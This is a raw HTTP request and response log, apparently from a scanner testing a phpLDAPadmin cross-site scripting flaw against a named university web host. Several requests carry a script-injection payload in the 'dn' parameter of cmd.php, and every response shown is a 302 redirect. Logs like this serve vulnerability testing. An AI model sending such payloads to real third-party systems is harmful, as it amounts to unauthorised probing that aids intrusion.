@@ -1,0 +1,243 @@
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+Set-Cookie: visid_incap_3239149=gFWE8rSXTBS2NATwbnxitQRyk2gAAAAAQUIPAAAAAADt6zgg1EcU3m86bs6XCBqu; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=ZpETA3RqmgTR37arov5JAwRyk2gAAAAAXnxehY9TxMlXU9OIMnnXOg==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056061-0 0NNN RT(1754493445202 19) q(0 -1 -1 -1) r(0 -1) B13(1,903758,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au/
+Set-Cookie: visid_incap_3239149=ouXYr4OUQ+m+6LEeaCf/8gRyk2gAAAAAQUIPAAAAAADoUSuiPsgaql4BldDeoDeL; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=9FDqD8PLXSPX37arov5JAwRyk2gAAAAAb1ECQAoMLWE3X6Zp4zQYjQ==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056063-0 0NNN RT(1754493445202 24) q(0 -1 -1 -1) r(1 -1) B13(1,10037,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+
+GET //index.php?redirect=true&meth=ajax HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au//index.php?redirect=true&meth=ajax
+Set-Cookie: visid_incap_3239149=9Sya+9ReRA60pgs4p6IbGQRyk2gAAAAAQUIPAAAAAAAd4si1GHvJcHssQZjR7s/J; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=07HrVns55QfZ37arov5JAwRyk2gAAAAA5Uc07wVfF+5Q+Bp0OnCNyQ==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056066-0 0NNN RT(1754493445202 26) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET //cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+Set-Cookie: visid_incap_3239149=OtgrmbH5RzqzoAJL7Je/bARyk2gAAAAAQUIPAAAAAABJsyVQV/TeZ0ijUbw5wIcm; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=7vp4amV7PiLh37arov5JAwRyk2gAAAAArKmG1+eCsg4yqWp3iZFnQQ==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12102527-0 0NNN RT(1754493445203 29) q(0 -1 -1 -1) r(0 -1) B13(1,903758,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+
+GET /phpldapadmin/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+Set-Cookie: visid_incap_3239149=EqD3d/q/RAO948QV4QMCgARyk2gAAAAAQUIPAAAAAADSIWDJRqRKJ3wGIq1+HgyR; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=m+lNdMljy0/k37arov5JAwRyk2gAAAAAXQzXoBS0d9XzztLcHszrzA==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12102529-0 0NNN RT(1754493445203 34) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au/
+Set-Cookie: visid_incap_3239149=gisSma8WRfGJ2DXGBQQG0ARyk2gAAAAAQUIPAAAAAAB65IvUgm1wCgiMjY5ECRx+; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=xWBXQxw6JB7l37arov5JAwRyk2gAAAAAqVDiWJIDLd0IFsquqzGNlg==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12102530-0 0NNN RT(1754493445203 36) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+Set-Cookie: visid_incap_3239149=6EaJxkPkRwSxx1ORs+wszQRyk2gAAAAAQUIPAAAAAAAchPfo7PtvjNWJ195fOEnY; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=an3ZVRa8eWbn37arov5JAwRyk2gAAAAABxhpYoIXtib0hzWqMYlKVg==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12102532-0 0NNN RT(1754493445203 40) q(0 -1 -1 -1) r(0 -1) B13(1,903758,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au/
+Set-Cookie: visid_incap_3239149=5v51NEh1T/25P2/LooVsygRyk2gAAAAAQUIPAAAAAADEkTO/DVHzxrC9CH6GBqzQ; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=RzOfe60AHBzo37arov5JAwRyk2gAAAAAkH19HHW1oFhfQpJj20okug==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12102533-0 0NNN RT(1754493445203 42) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
+[phpldapadmin-xss] Dumped HTTP request for https://cedrr.le.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+
+GET /htdocs/index.php/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: cedrr.le.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://cedrr.le.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://cedrr.le.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+Set-Cookie: visid_incap_3239149=iGosnZEYRea9IXU7lnARygRyk2gAAAAAQUIPAAAAAAAo6froSiKz8f3P+pc28bY9; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3239149=qH/IQ08YaiTq37arov5JAwRyk2gAAAAA1EIgWMhjJ9K4XacGZ9RI+g==; path=/; Domain=.le.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12102534-0 0NNN RT(1754493445203 43) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U18
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
